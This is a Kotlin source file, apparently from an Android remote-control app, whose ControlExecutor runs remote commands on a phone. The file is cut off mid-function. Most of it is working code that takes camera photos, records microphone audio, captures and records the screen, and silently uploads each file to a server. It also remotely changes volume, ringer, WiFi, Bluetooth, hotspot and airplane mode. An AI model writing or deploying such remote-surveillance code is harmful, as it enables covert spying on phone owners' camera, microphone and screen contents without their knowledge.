package com.abuzahra.manager.executor

import android.Manifest
import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.Rect
import android.graphics.YuvImage
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Base64
import android.util.Log
import android.view.Surface
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.abuzahra.manager.R
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.service.ScreenCaptureService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * ControlExecutor - Complete Implementation
 * All remote control commands with real functionality
 */
object ControlExecutor {

    private const val TAG = "ControlExecutor"
    private const val NOTIFICATION_CHANNEL_ID = "abu_zahra_control"
    
    // Camera state
    private var cameraDevice: CameraDevice? = null
    private var cameraSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    
    // Audio recording state
    private var mediaRecorder: MediaRecorder? = null
    private var audioRecord: AudioRecord? = null
    private var isRecordingAudio = false
    private var audioRecordFile: File? = null
    
    // Screen capture state
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var screenImageReader: ImageReader? = null
    private var isCapturingScreen = false
    private var screenCaptureLatch: CountDownLatch? = null
    private var capturedScreenBitmap: Bitmap? = null
    
    // Video recording state
    private var screenRecorder: MediaRecorder? = null
    private var isRecordingScreen = false
    private var screenRecordFile: File? = null

    // ===== PING =====
    fun ping(): Map<String, Any> {
        return mapOf(
            "status" to "online",
            "timestamp" to System.currentTimeMillis(),
            "uptime" to (System.currentTimeMillis() - com.abuzahra.manager.App.startTime),
            "message" to "Device is online and responding"
        )
    }

    // ===== VIBRATE =====
    fun vibrate(context: Context, params: Map<String, Any>): String {
        return try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (!vibrator.hasVibrator()) return "Device has no vibrator"
            
            val duration = ((params["arg"]?.toString()?.toLongOrNull() ?: 1000L)).coerceAtMost(5000)
            val pattern = params["pattern"] as? List<Long>
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val effect = if (pattern != null && pattern.isNotEmpty()) {
                    VibrationEffect.createWaveform(pattern.toLongArray(), -1)
                } else {
                    VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
                }
                vibrator.vibrate(effect)
            } else {
                @Suppress("DEPRECATION")
                if (pattern != null && pattern.isNotEmpty()) {
                    vibrator.vibrate(pattern.toLongArray(), -1)
                } else {
                    vibrator.vibrate(duration)
                }
            }
            "Vibrating for ${duration}ms"
        } catch (e: Exception) {
            Log.e(TAG, "Vibrate error", e)
            "Error: ${e.message}"
        }
    }

    // ===== RING =====
    fun ring(context: Context): String {
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
            am.ringerMode = AudioManager.RINGER_MODE_NORMAL

            val uri = Settings.System.DEFAULT_RINGTONE_URI
            val player = android.media.MediaPlayer.create(context, uri)
            player?.setAudioAttributes(
                AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build()
            )
            player?.isLooping = true
            player?.start()
            
            // Auto-stop after 30 seconds
            Thread { 
                Thread.sleep(30000)
                try { 
                    player?.stop()
                    player?.release()
                } catch (_: Exception) {}
            }.start()
            "Ringing..."
        } catch (e: Exception) {
            Log.e(TAG, "Ring error", e)
            "Error: ${e.message}"
        }
    }

    // ===== SCREENSHOT - REAL IMPLEMENTATION =====
    fun takeScreenshot(context: Context): Map<String, Any> {
        return try {
            // Check if we have screen capture permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val resultCode = ScreenCaptureService.lastResultCode
                val data = ScreenCaptureService.lastPermissionData
                
                if (resultCode == 0 || data == null) {
                    return mapOf(
                        "status" to "permission_required",
                        "message" to "Screen capture permission needed. Grant permission first.",
                        "action" to "request_screen_capture"
                    )
                }
                
                // Use the service to capture
                val screenshotResult = captureScreenReal(context, resultCode, data)
                screenshotResult
            } else {
                mapOf("error" to "Screenshot requires Android 5.0+")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot error", e)
            mapOf("error" to (e.message ?: "Screenshot failed"))
        }
    }
    
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun captureScreenReal(context: Context, resultCode: Int, data: Intent): Map<String, Any> {
        val latch = CountDownLatch(1)
        var resultBitmap: Bitmap? = null
        var error: String? = null
        
        try {
            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = mpm.getMediaProjection(resultCode, data)
            
            if (projection == null) {
                return mapOf("error" to "Failed to create media projection")
            }
            
            val metrics = context.resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi
            
            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            
            val virtualDisplay = projection.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.surface, null, null
            )
            
            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        
                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        if (bitmap != null) {
                            resultBitmap = bitmap
                        }
                        image.close()
                        latch.countDown()
                    }
                } catch (e: Exception) {
                    error = e.message
                    latch.countDown()
                }
            }, Handler(context.mainLooper))
            
            // Wait for capture
            latch.await(5, TimeUnit.SECONDS)
            
            // Cleanup
            virtualDisplay?.release()
            imageReader?.close()
            projection.stop()
            
            if (resultBitmap != null) {
                // Convert to base64
                val stream = ByteArrayOutputStream()
                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
                
                // Save to file
                val file = File(context.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use { it.write(stream.toByteArray()) }
                
                // Upload to server
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        ApiClient.uploadFile(file, "screenshot")
                    } catch (_: Exception) {}
                }
                
                mapOf(
                    "status" to "success",
                    "message" to "Screenshot captured",
                    "width" to resultBitmap!!.width,
                    "height" to resultBitmap!!.height,
                    "size" to stream.size(),
                    "file" to file.name,
                    "base64_preview" to base64.take(500) + "..."
                )
            } else {
                mapOf("error" to (error ?: "Failed to capture screen"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Screen capture error", e)
            mapOf("error" to e.message)
        }
    }

    // ===== CAMERA CAPTURE - REAL IMPLEMENTATION =====
    fun frontCamera(context: Context): Map<String, Any> {
        return takePhotoReal(context, CameraCharacteristics.LENS_FACING_FRONT)
    }

    fun backCamera(context: Context): Map<String, Any> {
        return takePhotoReal(context, CameraCharacteristics.LENS_FACING_BACK)
    }
    
    private fun takePhotoReal(context: Context, facing: Int): Map<String, Any> {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return mapOf("error" to "Camera2 requires Android 5.0+")
        }
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return mapOf(
                "error" to "Camera permission not granted",
                "permission_required" to "android.permission.CAMERA"
            )
        }
        
        val latch = CountDownLatch(1)
        var resultBitmap: Bitmap? = null
        var errorMessage: String? = null
        
        try {
            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            var cameraId: String? = null
            
            // Find camera with correct facing
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (lensFacing == facing) {
                    cameraId = id
                    break
                }
            }
            
            if (cameraId == null) {
                return mapOf("error" to "No ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera found")
            }
            
            // Setup handler thread
            val thread = HandlerThread("CameraThread").apply { start() }
            val handler = Handler(thread.looper)
            
            // Get optimal size
            val characteristics = manager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
            val size = sizes?.maxByOrNull { it.width * it.height }!!
            
            // Create image reader
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            
            reader.setOnImageAvailableListener({ imageReader ->
                try {
                    val image = imageReader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        
                        val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        resultBitmap = bitmap
                        
                        // Save to file
                        val file = File(context.cacheDir, "camera_${System.currentTimeMillis()}.jpg")
                        FileOutputStream(file).use { it.write(bytes) }
                        
                        // Upload in background
                        CoroutineScope(Dispatchers.IO).launch {
                            try { ApiClient.uploadFile(file, "camera") } catch (_: Exception) {}
                        }
                        
                        image.close()
                    }
                } catch (e: Exception) {
                    errorMessage = e.message
                }
                latch.countDown()
            }, handler)
            
            // Open camera
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureRequest.addTarget(reader.surface)
                        captureRequest.set(CaptureRequest.JPEG_ORIENTATION, 90)
                        
                        camera.createCaptureSession(
                            listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    session.capture(captureRequest.build(), null, handler)
                                    
                                    // Close after capture
                                    handler.postDelayed({
                                        camera.close()
                                        reader.close()
                                        thread.quitSafely()
                                    }, 2000)
                                }
                                
                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    errorMessage = "Session configuration failed"
                                    latch.countDown()
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        errorMessage = e.message
                        latch.countDown()
                    }
                }
                
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                }
                
                override fun onError(camera: CameraDevice, error: Int) {
                    errorMessage = "Camera error: $error"
                    camera.close()
                    latch.countDown()
                }
            }, handler)
            
            // Wait for result
            val success = latch.await(10, TimeUnit.SECONDS)
            
            if (resultBitmap != null) {
                val stream = ByteArrayOutputStream()
                resultBitmap!!.compress(Bitmap.CompressFormat.JPEG, 80, stream)
                val base64 = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
                
                mapOf(
                    "status" to "success",
                    "message" to "Photo captured from ${if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"} camera",
                    "width" to resultBitmap!!.width,
                    "height" to resultBitmap!!.height,
                    "size" to stream.size(),
                    "base64_preview" to base64.take(500) + "..."
                )
            } else {
                mapOf("error" to (errorMessage ?: "Failed to capture photo"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera capture error", e)
            mapOf("error" to (e.message ?: "Camera capture failed"))
        }
    }

    // ===== AUDIO RECORDING - REAL IMPLEMENTATION =====
    fun startAudioRecording(context: Context, params: Map<String, Any>): Map<String, Any> {
        return try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                return mapOf(
                    "error" to "RECORD_AUDIO permission not granted",
                    "permission_required" to "android.permission.RECORD_AUDIO"
                )
            }
            
            if (isRecordingAudio) {
                return mapOf("error" to "Already recording audio")
            }
            
            val duration = (params["duration"] as? Number)?.toInt() ?: 60
            val sampleRate = 44100
            val channelConfig = AudioFormat.CHANNEL_IN_MONO
            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            
            val audioFile = File(context.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            audioRecordFile = audioFile
            
            // Use MediaRecorder for compressed audio
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            
            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(sampleRate)
                setAudioEncodingBitRate(128000)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            
            isRecordingAudio = true
            
            // Auto-stop after duration
            CoroutineScope(Dispatchers.Main).launch {
                kotlinx.coroutines.delay(duration * 1000L)
                if (isRecordingAudio) {
                    stopAudioRecording(context)
                }
            }
            
            mapOf(
                "status" to "recording",
                "message" to "Audio recording started",
                "duration_seconds" to duration,
                "file" to audioFile.name
            )
        } catch (e: Exception) {
            Log.e(TAG, "Audio recording start error", e)
            mapOf("error" to (e.message ?: "Failed to start audio recording"))
        }
    }
    
    fun stopAudioRecording(context: Context): Map<String, Any> {
        return try {
            if (!isRecordingAudio) {
                return mapOf("error" to "Not recording audio")
            }
            
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            isRecordingAudio = false
            
            val file = audioRecordFile
            if (file != null && file.exists()) {
                // Upload to server
                CoroutineScope(Dispatchers.IO).launch {
                    try { ApiClient.uploadFile(file, "audio") } catch (_: Exception) {}
                }
                
                mapOf(
                    "status" to "success",
                    "message" to "Audio recording stopped",
                    "file" to file.name,
                    "size" to file.length()
                )
            } else {
                mapOf("error" to "Audio file not found")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Audio recording stop error", e)
            mapOf("error" to (e.message ?: "Failed to stop audio recording"))
        }
    }
    
    fun recordAudio(context: Context, params: Map<String, Any>): Map<String, Any> {
        val duration = (params["arg"]?.toString()?.toIntOrNull() ?: 30).coerceIn(1, 300)
        val startResult = startAudioRecording(context, mapOf("duration" to duration))
        
        if (startResult["error"] != null) {
            return startResult
        }
        
        return mapOf(
            "status" to "started",
            "message" to "Audio recording started for ${duration} seconds",
            "will_auto_stop" to true,
            "stop_command" to "Use stop_audio_recording to stop manually"
        )
    }

    // ===== SCREEN RECORDING - REAL IMPLEMENTATION =====
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun startScreenRecording(context: Context, params: Map<String, Any>): Map<String, Any> {
        if (isRecordingScreen) {
            return mapOf("error" to "Already recording screen")
        }
        
        val resultCode = ScreenCaptureService.lastResultCode
        val data = ScreenCaptureService.lastPermissionData
        
        if (resultCode == 0 || data == null) {
            return mapOf(
                "error" to "Screen capture permission not granted",
                "action" to "request_screen_capture"
            )
        }
        
        return try {
            val duration = (params["duration"] as? Number)?.toInt() ?: 60
            val metrics = context.resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi
            
            val videoFile = File(context.cacheDir, "screen_${System.currentTimeMillis()}.mp4")
            screenRecordFile = videoFile
            
            // Create media projection
            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = mpm.getMediaProjection(resultCode, data)
            mediaProjection = projection
            
            // Setup recorder
            screenRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            
            screenRecorder?.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(8 * 1000 * 1000) // 8 Mbps
                setOutputFile(videoFile.absolutePath)
                prepare()
            }
            
            // Create virtual display
            virtualDisplay = projection?.createVirtualDisplay(
                "ScreenRecord",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                screenRecorder?.surface, null, null
            )
            
            screenRecorder?.start()
            isRecordingScreen = true
            
            // Auto-stop after duration
            CoroutineScope(Dispatchers.Main).launch {
                kotlinx.coroutines.delay(duration * 1000L)
                if (isRecordingScreen) {
                    stopScreenRecording(context)
                }
            }
            
            mapOf(
                "status" to "recording",
                "message" to "Screen recording started",
                "duration_seconds" to duration,
                "resolution" to "${width}x${height}",
                "file" to videoFile.name
            )
        } catch (e: Exception) {
            Log.e(TAG, "Screen recording start error", e)
            mapOf("error" to (e.message ?: "Failed to start screen recording"))
        }
    }
    
    fun stopScreenRecording(context: Context): Map<String, Any> {
        if (!isRecordingScreen) {
            return mapOf("error" to "Not recording screen")
        }
        
        return try {
            screenRecorder?.apply {
                stop()
                release()
            }
            screenRecorder = null
            
            virtualDisplay?.release()
            virtualDisplay = null
            
            mediaProjection?.stop()
            mediaProjection = null
            
            isRecordingScreen = false
            
            val file = screenRecordFile
            if (file != null && file.exists()) {
                // Upload to server
                CoroutineScope(Dispatchers.IO).launch {
                    try { ApiClient.uploadFile(file, "video") } catch (_: Exception) {}
                }
                
                mapOf(
                    "status" to "success",
                    "message" to "Screen recording stopped",
                    "file" to file.name,
                    "size" to file.length()
                )
            } else {
                mapOf("error" to "Video file not found")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Screen recording stop error", e)
            mapOf("error" to (e.message ?: "Failed to stop screen recording"))
        }
    }
    
    fun recordScreen(context: Context, params: Map<String, Any>): Map<String, Any> {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return mapOf("error" to "Screen recording requires Android 5.0+")
        }
        
        val duration = (params["arg"]?.toString()?.toIntOrNull() ?: 30).coerceIn(1, 300)
        return startScreenRecording(context, mapOf("duration" to duration))
    }

    // ===== TORCH =====
    fun torchOn(context: Context): String {
        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            for (id in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                val lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (flashAvailable && lensFacing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraManager.setTorchMode(id, true)
                    return "Torch ON"
                }
            }
            "No flash available"
        } catch (e: Exception) {
            Log.e(TAG, "Torch on error", e)
            "Error: ${e.message}"
        }
    }

    fun torchOff(context: Context): String {
        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            for (id in cameraManager.cameraIdList) {
                try { cameraManager.setTorchMode(id, false) } catch (_: Exception) {}
            }
            "Torch OFF"
        } catch (e: Exception) {
            Log.e(TAG, "Torch off error", e)
            "Error: ${e.message}"
        }
    }

    // ===== SET VOLUME =====
    fun setVolume(context: Context, params: Map<String, Any>): String {
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val volumeStr = params["arg"]?.toString() ?: "50"
            val volume = volumeStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
            val streamType = when (params["stream"]?.toString()?.lowercase()) {
                "ring", "ringtone" -> AudioManager.STREAM_RING
                "alarm" -> AudioManager.STREAM_ALARM
                "notification" -> AudioManager.STREAM_NOTIFICATION
                "call", "voice_call" -> AudioManager.STREAM_VOICE_CALL
                "system" -> AudioManager.STREAM_SYSTEM
                else -> AudioManager.STREAM_MUSIC
            }
            val maxVol = am.getStreamMaxVolume(streamType)
            am.setStreamVolume(streamType, (maxVol * volume / 100), AudioManager.FLAG_SHOW_UI)
            "Volume set to $volume% for ${params["stream"] ?: "media"}"
        } catch (e: Exception) {
            Log.e(TAG, "Set volume error", e)
            "Error: ${e.message}"
        }
    }

    // ===== SET BRIGHTNESS =====
    fun setBrightness(context: Context, params: Map<String, Any>): String {
        return try {
            val brightnessStr = params["arg"]?.toString() ?: "50"
            val brightness = brightnessStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
            
            // Check if can write settings
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && 
                !Settings.System.canWrite(context)) {
                context.startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                return "Opening write settings permission"
            }
            
            // Set brightness mode to manual
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, 
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
            
            // Set brightness (0-255)
            val brightnessValue = (brightness * 255 / 100)
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS, brightnessValue)
            "Brightness set to $brightness%"
        } catch (e: Exception) {
            Log.e(TAG, "Set brightness error", e)
            "Error: ${e.message}"
        }
    }

    // ===== SET RINGTONE =====
    fun setRingtone(context: Context, params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        if (arg.isBlank()) return "No ringtone URI provided"
        return try {
            if (!Settings.System.canWrite(context)) {
                context.startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                return "Opening write settings permission - grant WRITE_SETTINGS first"
            }
            val ringtoneUri = android.net.Uri.parse(arg)
            // Validate the URI by checking if we can open it
            val ringtone = android.media.RingtoneManager.getRingtone(context, ringtoneUri)
            if (ringtone != null) {
                // Set as default ringtone
                Settings.System.putString(context.contentResolver, Settings.System.RINGTONE, ringtoneUri.toString())
                // Preview the ringtone briefly
                val player = android.media.MediaPlayer.create(context, ringtoneUri)
                player?.setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                )
                player?.setOnCompletionListener { mp -> mp.release() }
                player?.start()
                Thread { Thread.sleep(5000); try { player?.stop(); player?.release() } catch (_: Exception) {} }.start()
                "Ringtone set and previewing"
            } else {
                "Failed to load ringtone from URI: $arg - ensure it points to a valid audio file"
            }
        } catch (e: SecurityException) {
            "Error: Permission denied - WRITE_SETTINGS required: ${e.message}"
        } catch (e: Exception) {
            Log.e(TAG, "Set ringtone error", e)
            "Error: ${e.message}"
        }
    }

    // ===== WIFI CONTROL =====
    fun enableWifi(context: Context): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_WIFI).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Opening WiFi settings panel"
            } else {
                @Suppress("DEPRECATION")
                wm.isWifiEnabled = true
                "WiFi enabled"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Enable WiFi error", e)
            "Error: ${e.message}"
        }
    }

    fun disableWifi(context: Context): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_WIFI).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Opening WiFi settings panel"
            } else {
                @Suppress("DEPRECATION")
                wm.isWifiEnabled = false
                "WiFi disabled"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Disable WiFi error", e)
            "Error: ${e.message}"
        }
    }

    // ===== BLUETOOTH CONTROL =====
    fun enableBluetooth(context: Context): String {
        return try {
            val adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
            if (adapter == null) {
                return "Bluetooth not available on this device"
            }
            if (!adapter.isEnabled) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) 
                        != PackageManager.PERMISSION_GRANTED) {
                        return "BLUETOOTH_CONNECT permission required"
                    }
                }
                adapter.enable()
                "Bluetooth enabling..."
            } else {
                "Bluetooth already enabled"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Enable Bluetooth error", e)
            "Error: ${e.message}"
        }
    }

    fun disableBluetooth(context: Context): String {
        return try {
            val adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
            if (adapter == null) {
                return "Bluetooth not available on this device"
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) 
                    != PackageManager.PERMISSION_GRANTED) {
                    return "BLUETOOTH_CONNECT permission required"
                }
            }
            adapter.disable()
            "Bluetooth disabled"
        } catch (e: Exception) {
            Log.e(TAG, "Disable Bluetooth error", e)
            "Error: ${e.message}"
        }
    }

    // ===== MOBILE DATA =====
    fun enableMobileData(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_INTERNET_CONNECTIVITY).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Opening network settings panel"
            } else {
                "Mobile data control requires system privileges on newer Android"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Enable mobile data error", e)
            "Error: ${e.message}"
        }
    }

    fun disableMobileData(context: Context): String = enableMobileData(context)

    // ===== HOTSPOT =====
    fun enableHotspot(context: Context): String {
        return try {
            // Try WifiManager.setWifiApEnabled via reflection (requires system/root)
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val method = wm.javaClass.getDeclaredMethod("setWifiApEnabled", android.net.wifi.WifiConfiguration::class.java, Boolean::class.javaPrimitiveType)
            method.isAccessible = true
            method.invoke(wm, null, true)
            "Hotspot enabled via reflection"
        } catch (e: Exception) {
            Log.w(TAG, "Hotspot reflection failed: ${e.message}")
            try {
                context.startActivity(Intent(Settings.ACTION_WIRELESS_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Hotspot control requires WRITE_SETTINGS and system-level WiFi AP API (only available with root or system app privileges). Opening WiFi settings."
            } catch (e2: Exception) {
                Log.e(TAG, "Enable hotspot error", e2)
                "Error: ${e2.message}"
            }
        }
    }

    fun disableHotspot(context: Context): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val method = wm.javaClass.getDeclaredMethod("setWifiApEnabled", android.net.wifi.WifiConfiguration::class.java, Boolean::class.javaPrimitiveType)
            method.isAccessible = true
            method.invoke(wm, null, false)
            "Hotspot disabled via reflection"
        } catch (e: Exception) {
            Log.w(TAG, "Hotspot disable reflection failed: ${e.message}")
            try {
                context.startActivity(Intent(Settings.ACTION_WIRELESS_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Hotspot control requires WRITE_SETTINGS and system-level WiFi AP API (only available with root or system app privileges). Opening WiFi settings."
            } catch (e2: Exception) {
                Log.e(TAG, "Disable hotspot error", e2)
                "Error: ${e2.message}"
            }
        }
    }

    // ===== AIRPLANE MODE =====
    fun airplaneOn(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                // Requires WRITE_SECURE_SETTINGS - system app only
                Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 1)
                val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
                intent.putExtra("state", true)
                intent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY)
                context.sendBroadcast(intent)
                "Airplane mode ON (requires system app for full functionality)"
            } else {
                @Suppress("DEPRECATION")
                Settings.System.putInt(context.contentResolver, Settings.System.AIRPLANE_MODE_ON, 1)
                "Airplane mode ON"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Airplane on error", e)
            "Error: ${e.message} - Airplane mode control requires system privileges"
        }
    }

    fun airplaneOff(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
